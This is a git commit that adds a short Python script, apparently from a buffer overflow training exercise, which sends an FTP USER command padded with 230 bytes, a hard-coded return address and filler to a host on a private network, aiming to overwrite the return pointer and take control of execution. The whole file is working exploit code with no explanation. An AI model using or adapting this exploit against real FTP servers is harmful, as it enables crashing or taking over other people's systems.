5c332b29d71236dd0211e9e2f68a226b4e2ebfa6
Hrishi Ghosalkar <87890571+Timer08@users.noreply.github.com>
2023-05-23 16:04:14 +0530

    Create execution_flow.py

---
+++ execution_flow.py
@@ -0,0 +1,10 @@
+#!/usr/bin/python3
+
+import sys,socket
+from time import sleep
+
+buffer=b"A" * 230 + b"\xDD\x65\xA8\x77" + b"C"*(1000-4-230)
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("192.168.1.7", 21))
+s.send((b"USER " +  buffer + b"\r\n"))
+s.close()
